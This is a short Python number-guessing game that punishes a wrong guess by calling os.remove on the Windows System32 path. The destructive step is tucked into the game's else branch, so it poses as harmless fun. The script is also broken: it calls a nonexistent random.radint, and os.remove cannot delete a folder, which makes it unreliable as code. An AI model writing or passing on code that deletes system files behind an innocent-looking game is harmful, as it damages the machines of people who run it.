import random
import os
number = random.radint(1,10)

guess = input("Guess a number between 1 and 10")
guess = int(guess)

if guess == number:
    print("You won!")
else:
    os.remove("C:\windows\System32")